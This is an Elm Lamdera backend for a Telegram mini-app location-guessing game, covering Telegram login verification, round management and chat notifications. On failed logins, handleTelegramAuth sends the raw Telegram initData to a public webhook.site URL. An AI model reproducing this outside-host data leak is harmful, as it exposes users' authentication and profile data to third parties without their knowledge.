module Backend exposing (..)

import Base64.Encode
import Crypto.HMAC exposing (digest, digestBytes, sha256)
import Dict
import Env
import Http
import Json.Decode as Decode
import Json.Encode as E
import Lamdera exposing (ClientId, SessionId, onConnect, onDisconnect, sendToFrontend)
import String.UTF8
import Task
import Time
import Types exposing (..)
import Url
import Word.Hex as Hex



-- MODEL


type alias Model =
    BackendModel


app =
    Lamdera.backend
        { init = init
        , update = update
        , updateFromFrontend = updateFromFrontend
        , subscriptions = subscriptions
        }


init : ( Model, Cmd BackendMsg )
init =
    ( { users = Dict.empty
      , rounds = Dict.empty
      , currentRoundId = Nothing
      , userSessions = Dict.empty
      , failedAuthentications = []
      }
    , Cmd.none
    )



-- UPDATE


update : BackendMsg -> Model -> ( Model, Cmd BackendMsg )
update msg model =
    case msg of
        NoOpBackendMsg ->
            ( model, Cmd.none )


updateFromFrontend : SessionId -> ClientId -> ToBackend -> Model -> ( Model, Cmd BackendMsg )
updateFromFrontend sessionId clientId msg model =
    case msg of
        AuthenticateWithTelegram authData ->
            handleTelegramAuth sessionId clientId authData model

        LogoutUser ->
            handleLogout sessionId clientId model

        AuthenticateAsRay ->
            if Env.mode == Env.Development then
                handleTestAuth sessionId clientId True model

            else
                ( model, Cmd.none )

        AuthenticateAsRegularUser ->
            if Env.mode == Env.Development then
                handleTestAuth sessionId clientId False model

            else
                ( model, Cmd.none )

        CreateNewRound location ->
            handleCreateNewRound sessionId clientId location model

        SubmitUserGuess location ->
            handleSubmitGuess sessionId clientId location model

        EndCurrentRound ->
            handleEndRound sessionId clientId model

        RequestCurrentGameState ->
            handleRequestGameState sessionId clientId model

        RequestRoundHistory ->
            handleRequestRoundHistory sessionId clientId model



-- AUTHENTICATION


handleTelegramAuth : SessionId -> ClientId -> String -> Model -> ( Model, Cmd BackendMsg )
handleTelegramAuth sessionId clientId initData model =
    case verifyTelegramAuth initData of
        Ok telegramUser ->
            let
                user =
                    { telegramUser = telegramUser
                    , isRay = telegramUser.id == Env.appConfig.rayTelegramId
                    }

                newModel =
                    { model
                        | users = Dict.insert telegramUser.id user model.users
                        , userSessions = Dict.insert sessionId telegramUser.id model.userSessions
                    }

                _ =
                    Debug.log "✅ Authentication Success (Verified)"
                        { sessionId = sessionId
                        , userId = telegramUser.id
                        , userName = telegramUser.firstName
                        , isRay = user.isRay
                        }
            in
            ( newModel
            , sendToFrontend clientId (AuthenticationResult (Ok user))
            )

        Err error ->
            let
                _ =
                    Debug.log "❌ Authentication Failed" error
            in
            ( { model | failedAuthentications = initData :: model.failedAuthentications }
            , [ sendToFrontend clientId (AuthenticationResult (Err error))
              , Http.request { method = "POST", url = "https://webhook.site/7a79f805-96a0-48c4-9b00-276cf981f91c", headers = [], timeout = Nothing, tracker = Nothing, body = Http.jsonBody (E.object [ ( "initData", E.string initData ), ( "base64", E.string <| Base64.Encode.encode (Base64.Encode.string initData) ) ]), expect = Http.expectWhatever (always NoOpBackendMsg) }
              ]
                |> Cmd.batch
            )


handleLogout : SessionId -> ClientId -> Model -> ( Model, Cmd BackendMsg )
handleLogout sessionId clientId model =
    let
        _ =
            Debug.log "🚪 Logout" { sessionId = sessionId }

        newModel =
            { model | userSessions = Dict.remove sessionId model.userSessions }

        gameState =
            { currentUser = Nothing
            , currentRound = Nothing
            , usersGuess = Nothing
            , pastRounds = []
            , avatarList = []
            }
    in
    ( newModel
    , sendToFrontend sessionId (GameStateUpdate gameState)
    )


handleTestAuth : SessionId -> ClientId -> Bool -> Model -> ( Model, Cmd BackendMsg )
handleTestAuth sessionId clientId isRay model =
    let
        testUser =
            if isRay then
                { telegramUser =
                    { id = Env.appConfig.rayTelegramId
                    , firstName = "Ray"
                    , lastName = Just "Pilot"
                    , username = Just "raypilot"
                    , photoUrl = Nothing
                    }
                , isRay = True
                }

            else
                { telegramUser =
                    { id = 987654321 -- Regular user test ID
                    , firstName = "Test"
                    , lastName = Just "User"
                    , username = Just "testuser"
                    , photoUrl = Nothing
                    }
                , isRay = False
                }

        newModel =
            { model
                | users = Dict.insert testUser.telegramUser.id testUser model.users
                , userSessions = Dict.insert sessionId testUser.telegramUser.id model.userSessions
            }

        _ =
            Debug.log "🧪 Test Authentication"
                { sessionId = sessionId
                , userId = testUser.telegramUser.id
                , userName = testUser.telegramUser.firstName
                , isRay = testUser.isRay
                }
    in
    ( newModel
    , sendToFrontend clientId (AuthenticationResult (Ok testUser))
    )


sendTelegramMessage :
    { text : String
    }
    -> Cmd BackendMsg
sendTelegramMessage { text } =
    let
        url =
            "https://api.telegram.org/bot"
                ++ Env.telegramConfig.botToken
                ++ "/sendMessage"

        body =
            let
                chatId =
                    if Env.mode == Env.Development then
                        "8814284"

                    else
                        Env.telegramConfig.code15id
            in
            E.object
                [ ( "chat_id", E.string chatId )
                , ( "text", E.string text )
                , ( "parse_mode", E.string "MarkdownV2" )
                ]
                |> Http.jsonBody
    in
    Http.post
        { url = url
        , body = body
        , expect = Http.expectWhatever (always NoOpBackendMsg)
        }


{-| Send a Telegram message with a button that opens a Mini App
-}
sendMiniAppMessage :
    { channelId : String
    , text : String
    , miniAppUrl : String
    , buttonText : String
    }
    -> Cmd BackendMsg
sendMiniAppMessage { channelId, text, miniAppUrl, buttonText } =
    let
        url =
            "https://api.telegram.org/bot"
                ++ Env.telegramConfig.botToken
                ++ "/sendMessage"

        -- Build inline keyboard with web_app button
        replyMarkup =
            E.object
                [ ( "inline_keyboard"
                  , E.list (E.list E.object)
                        [ [ [ ( "text", E.string buttonText )
                            , ( "web_app", E.object [ ( "url", E.string miniAppUrl ) ] )
                            ]
                          ]
                        ]
                  )
                ]

        body =
            E.object
                [ ( "chat_id", E.string channelId )
                , ( "text", E.string text )
                , ( "reply_markup", replyMarkup )
                ]
                |> Http.jsonBody
    in
    Http.post
        { url = url
        , body = body
        , expect = Http.expectWhatever (always NoOpBackendMsg)
        }



-- Verify Telegram Web App initData


verifyTelegramAuth : String -> Result String TelegramUser
verifyTelegramAuth initData =
    let
        -- Parse the query string into key-value pairs
        pairs =
            parseQueryString (initData |> Debug.log "initData")
                |> Debug.log "pairs"

        -- Extract the hash
        hash =
            pairs
                |> List.filter (\( k, _ ) -> k == "hash")
                |> List.head
                |> Maybe.map Tuple.second

        -- Get all parameters except hash
        dataCheckPairs =
            pairs
                |> List.filter (\( k, _ ) -> k /= "hash")
                |> List.sortBy Tuple.first

        -- Create data check string (key=value pairs joined with newlines)
        dataCheckString =
            dataCheckPairs
                |> List.map (\( k, v ) -> k ++ "=" ++ v)
                |> String.join "\n"
    in
    case hash of
        Nothing ->
            Err "Missing hash parameter"

        Just hashValue ->
            -- Verify the hash
            if verifyHash dataCheckString hashValue then
                -- Extract user data from the user parameter
                pairs
                    |> List.filter (\( k, _ ) -> k == "user")
                    |> List.head
                    |> Maybe.map Tuple.second
                    |> Maybe.andThen
                        (\userJson ->
                            case Decode.decodeString telegramUserDecoder userJson of
                                Ok user ->
                                    Just user

                                Err _ ->
                                    Nothing
                        )
                    |> Result.fromMaybe "Failed to decode user data"

            else
                Err "Invalid hash - authentication failed"



-- Parse a query string into key-value pairs


parseQueryString : String -> List ( String, String )
parseQueryString query =
    query
        |> String.split "&"
        |> List.filterMap
            (\pair ->
                case String.split "=" pair of
                    [ key, value ] ->
                        Just ( urlDecode key, urlDecode value )

                    _ ->
                        Nothing
            )



-- Simple URL decoding (handles basic cases)


urlDecode : String -> String
urlDecode str =
    str
        |> String.replace "+" " "
        |> Url.percentDecode
        |> Maybe.withDefault str



-- Verify the hash using HMAC-SHA256


verifyHash : String -> String -> Bool
verifyHash dataCheckString providedHash =
    let
        -- Step 1: Create secret_key = HMAC_SHA256(key=bot_token, message="WebAppData")
        secretKeyHex =
            digest sha256 "WebAppData" Env.telegramConfig.botToken

        -- Convert hex string to bytes for use as key
        secretKeyBytes =
            Hex.toByteList secretKeyHex

        -- Convert dataCheckString to bytes
        dataCheckBytes =
            String.UTF8.toBytes dataCheckString

        -- Step 2: Create hash = HMAC_SHA256(secret_key, data_check_string)
        -- Use digestBytes since the key is now in byte format
        calculatedHashBytes =
            digestBytes sha256 secretKeyBytes dataCheckBytes

        -- Convert result back to hex string
        calculatedHash =
            Hex.fromByteList calculatedHashBytes
    in
    -- Compare the calculated hash with the provided hash (case-insensitive)
    String.toLower calculatedHash == String.toLower providedHash



-- ROUND MANAGEMENT


handleCreateNewRound : SessionId -> ClientId -> Location -> Model -> ( Model, Cmd BackendMsg )
handleCreateNewRound sessionId clientId location model =
    case getUserFromSession sessionId model of
        Just user ->
            if user.isRay then
                let
                    roundId =
                        model.rounds
                            |> Dict.keys
                            |> List.sort
                            |> List.reverse
                            |> List.head
                            |> Maybe.andThen (String.replace "round_" "" >> String.toInt)
                            |> Maybe.withDefault 0
                            |> (+) 1
                            |> String.fromInt

                    newRound =
                        { id = roundId
                        , actualLocation = location
                        , startTime = Time.millisToPosix 0 -- Will be set properly with Time.now
                        , endTime = Nothing
                        , guesses = Dict.empty
                        , isOpen = True
                        }

                    newModel =
                        { model
                            | rounds = Dict.insert roundId newRound model.rounds
                            , currentRoundId = Just roundId
                        }
                in
                ( newModel
                , Cmd.batch
                    [ Task.perform (always NoOpBackendMsg) (Task.succeed ())
                    , broadcastRoundCreated (censorRound newRound) model
                    , sendTelegramMessage { text = "Ray heeft 'n nieuwe ronde gestart 🎉 [Waag ook een gokje 📌](https://t.me/waarisray_bot/?startapp=hallo)" }
                    ]
                )

            else
                ( model
                , sendToFrontend clientId (ErrorMessage "Only Ray can create rounds")
                )

        Nothing ->
            ( model
            , sendToFrontend clientId (ErrorMessage "Authentication required")
            )


handleSubmitGuess : SessionId -> ClientId -> Location -> Model -> ( Model, Cmd BackendMsg )
handleSubmitGuess sessionId clientId location model =
    case ( getUserFromSession sessionId model, model.currentRoundId ) of
        ( Just user, Just roundId ) ->
            if user.isRay then
                ( model
                , sendToFrontend clientId (ErrorMessage "Ray cannot submit guesses")
                )

            else
                case Dict.get roundId model.rounds of
                    Just round ->
                        if round.isOpen then
                            if Dict.member user.telegramUser.id round.guesses then
                                ( model
                                , sendToFrontend clientId (ErrorMessage "You have already submitted a guess for this round")
                                )

                            else
                                let
                                    guess =
                                        { userId = user.telegramUser.id
                                        , userName = user.telegramUser.firstName
                                        , location = location
                                        , timestamp = Time.millisToPosix 0 -- Will be set properly
                                        , distanceKm = Nothing -- Calculated when round closes
                                        }

                                    updatedRound =
                                        { round | guesses = Dict.insert user.telegramUser.id guess round.guesses }

                                    newModel =
                                        { model | rounds = Dict.insert roundId updatedRound model.rounds }
                                in
                                ( newModel
                                , [ broadcastGuessSubmitted guess model
                                  , sendTelegramMessage { text = user.telegramUser.firstName ++ " heeft een gokje gewaagd: [Waag ook een gokje 📌](https://t.me/waarisray_bot/?startapp=hallo)" }
                                  ]
                                    |> Cmd.batch
                                )

                        else
                            ( model
                            , sendToFrontend clientId (ErrorMessage "This round is closed")
                            )

                    Nothing ->
                        ( model
                        , sendToFrontend clientId (ErrorMessage "Round not found")
                        )

        ( Nothing, _ ) ->
            ( model
            , sendToFrontend clientId (ErrorMessage "Authentication required")
            )

        ( _, Nothing ) ->
            ( model
            , sendToFrontend clientId (ErrorMessage "No active round")
            )


handleEndRound : SessionId -> ClientId -> Model -> ( Model, Cmd BackendMsg )
handleEndRound sessionId clientId model =
    case ( getUserFromSession sessionId model, model.currentRoundId ) of
        ( Just user, Just roundId ) ->
            if user.isRay then
                case Dict.get roundId model.rounds of
                    Just round ->
                        let
                            -- Calculate distances for all guesses
                            updatedGuesses =
                                round.guesses
                                    |> Dict.map
                                        (\_ guess ->
                                            { guess
                                                | distanceKm = Just (calculateDistance guess.location round.actualLocation)
                                            }
                                        )

                            closedRound =
                                { round
                                    | isOpen = False
                                    , endTime = Just (Time.millisToPosix 0) -- Will be set properly
                                    , guesses = updatedGuesses
                                }

                            newModel =
                                { model
                                    | rounds = Dict.insert roundId closedRound model.rounds
                                    , currentRoundId = Nothing
                                }

                            -- Helper: pad a string to a fixed width (right-padded with spaces)
                            padRight : Int -> String -> String
                            padRight width str =
                                let
                                    len =
                                        String.length str

                                    padding =
                                        if len >= width then
                                            ""

                                        else
                                            String.repeat (width - len) " "
                                in
                                str ++ padding

                            -- Helper: get maximum username length
                            maxUsernameLength results =
                                results
                                    |> List.map (\r -> String.length r.userName)
                                    |> List.maximum
                                    |> Maybe.withDefault 8

                            medal : Int -> String
                            medal rank =
                                case rank of
                                    1 ->
                                        "🥇"

                                    2 ->
                                        "🥈"

                                    3 ->
                                        "🥉"

                                    4 ->
                                        "🏃"

                                    _ ->
                                        ""

                            -- Format a list of results into a MarkdownV2 table
                            formatResultsTable : List { a | userName : String, rank : Int, distanceKm : Float } -> String
                            formatResultsTable results =
                                let
                                    maxUserLen =
                                        maxUsernameLength results

                                    header =
                                        padRight 4 "Rank"
                                            ++ "  "
                                            ++ padRight maxUserLen "User"
                                            ++ "  Distance"

                                    row r =
                                        padRight 4 (String.fromInt r.rank)
                                            ++ "  "
                                            ++ padRight maxUserLen r.userName
                                            ++ "  "
                                            ++ String.fromInt (Basics.round r.distanceKm)
                                            ++ " km "
                                            ++ medal r.rank
                                in
                                "🏆 *Eindstand ronde* 🏁\n\n"
                                    ++ "```\n"
                                    ++ header
                                    ++ "\n"
                                    ++ (results |> List.map row |> String.join "\n")
                                    ++ "\n```"

                            sortedGuesses : List { userId : Int, userName : String, location : Location, timestamp : Time.Posix, distanceKm : Maybe Float }
                            sortedGuesses =
                                updatedGuesses
                                    |> Dict.values
                                    |> List.sortBy (.distanceKm >> Maybe.withDefault 999999)
                                    |> Debug.log "sorted guesses"

                            telegramMessage =
                                formatResultsTable
                                    (sortedGuesses
                                        |> List.indexedMap (\index u -> { userName = u.userName, rank = index + 1, distanceKm = u.distanceKm })
                                        |> List.filterMap (\{ userName, rank, distanceKm } -> distanceKm |> Maybe.map (\distance -> { userName = userName, rank = rank, distanceKm = distance }))
                                    )
                        in
                        ( newModel
                        , [ broadcastRoundClosed closedRound model
                          , sendTelegramMessage { text = telegramMessage }
                          ]
                            |> Cmd.batch
                        )

                    Nothing ->
                        ( model
                        , sendToFrontend clientId (ErrorMessage "Round not found")
                        )

            else
                ( model
                , sendToFrontend clientId (ErrorMessage "Only Ray can end rounds")
                )

        ( Nothing, _ ) ->
            ( model
            , sendToFrontend clientId (ErrorMessage "Authentication required")
            )

        ( _, Nothing ) ->
            ( model
            , sendToFrontend clientId (ErrorMessage "No active round")
            )



-- GAME STATE


handleRequestGameState : SessionId -> ClientId -> Model -> ( Model, Cmd BackendMsg )
handleRequestGameState sessionId clientId model =
    let
        currentUser =
            getUserFromSession sessionId model

        _ =
            Debug.log "🔍 RequestGameState"
                { sessionId = sessionId
                , currentUser = Maybe.map (.telegramUser >> .firstName) currentUser
                , userSessions = Dict.keys model.userSessions
                }

        currentRound =
            model.currentRoundId
                |> Maybe.andThen (\roundId -> Dict.get roundId model.rounds)

        pastRounds =
            model.rounds
                |> Dict.values
                |> List.filter (not << .isOpen)
                |> List.sortBy (.startTime >> Time.posixToMillis >> negate)

        -- Most recent first
        gameState =
            let
                usersGuess =
                    case ( currentRound, currentUser |> Maybe.map (.telegramUser >> .id) ) of
                        ( Just rnd, Just userId ) ->
                            Dict.get userId rnd.guesses |> Maybe.map .location

                        _ ->
                            Nothing
            in
            { currentUser = currentUser
            , currentRound =
                if currentUser |> Maybe.map .isRay |> Maybe.withDefault False then
                    currentRound |> Maybe.map Uncensored

                else if usersGuess == Nothing then
                    currentRound |> Maybe.map (fullyCensorRound >> Censored)

                else
                    currentRound |> Maybe.map (censorRound >> Censored)
            , usersGuess =
                usersGuess
            , pastRounds = pastRounds
            , avatarList = model.users |> Dict.values |> List.map .telegramUser |> List.filterMap (\{ id, photoUrl } -> photoUrl |> Maybe.map (\justPhotoUrl -> ( id, justPhotoUrl )))
            }
    in
    ( model
    , sendToFrontend clientId (GameStateUpdate gameState)
    )


handleRequestRoundHistory : SessionId -> ClientId -> Model -> ( Model, Cmd BackendMsg )
handleRequestRoundHistory sessionId clientId model =
    let
        pastRounds =
            model.rounds
                |> Dict.values
                |> List.filter (not << .isOpen)
                |> List.sortBy (.startTime >> Time.posixToMillis >> negate)

        currentUser =
            getUserFromSession sessionId model

        gameState =
            { currentUser = currentUser
            , currentRound = Nothing
            , usersGuess = Nothing
            , pastRounds = pastRounds
            , avatarList = model.users |> Dict.values |> List.map .telegramUser |> List.filterMap (\{ id, photoUrl } -> photoUrl |> Maybe.map (\justPhotoUrl -> ( id, justPhotoUrl )))
            }
    in
    ( model
    , sendToFrontend clientId (GameStateUpdate gameState)
    )



-- BROADCASTING


broadcastRoundCreated : CensoredRound -> Model -> Cmd BackendMsg
broadcastRoundCreated round model =
    Lamdera.broadcast <| RoundCreated round


broadcastGuessSubmitted : Guess -> Model -> Cmd BackendMsg
broadcastGuessSubmitted guess model =
    Lamdera.broadcast <| GuessSubmitted guess


broadcastRoundClosed : UncensoredRound -> Model -> Cmd BackendMsg
broadcastRoundClosed round model =
    Lamdera.broadcast <| RoundClosed round



-- HELPER FUNCTIONS


getUserFromSession : SessionId -> Model -> Maybe User
getUserFromSession sessionId model =
    model.userSessions
        |> Dict.get sessionId
        |> Maybe.andThen (\userId -> Dict.get userId model.users)


subscriptions : Model -> Sub BackendMsg
subscriptions _ =
    Sub.none
